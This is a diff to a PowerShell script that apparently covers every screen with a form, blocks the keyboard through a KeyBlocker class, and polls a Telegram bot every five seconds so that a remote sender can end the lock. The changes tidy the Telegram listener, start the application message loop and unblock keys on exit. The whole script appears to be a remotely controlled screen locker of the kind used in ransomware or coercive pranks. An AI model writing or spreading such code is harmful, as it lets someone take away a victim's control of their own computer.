@@ -103,20 +103,18 @@ $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form
 }
 
-# TELEGRAM LISTENER USING TIMER (Stable & Fixed)
+# TELEGRAM LISTENER USING TIMER (Fixed offset)
 $timer = New-Object System.Windows.Forms.Timer
-$timer.Interval = 5000 # Check every 5 seconds
+$timer.Interval = 5000 # check every 5 seconds
 $offset = 0
 
-# Initialize offset to current latest message (prevent immediate shutdown)
+# Skip past updates
 try {
     $initialUpdates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -UseBasicParsing -TimeoutSec 5
     if ($initialUpdates.result.Count -gt 0) {
         $offset = ($initialUpdates.result | Select-Object -Last 1).update_id + 1
     }
-} catch {
-    # in case of error, offset remains 0
-}
+} catch { }
 
 $timer.Add_Tick({
     try {
@@ -128,7 +126,15 @@ $timer.Add_Tick({
                 [System.Windows.Forms.Application]::Exit()
             }
         }
-    } catch {}
+    } catch { }
 })
 
 $timer.Start()
+
+# START THE APPLICATION MESSAGE LOOP
+[System.Windows.Forms.Application]::Run()
+
+# STOP TIMER ON EXIT
+$timer.Stop()
+[KeyBlocker]::Unblock()
+
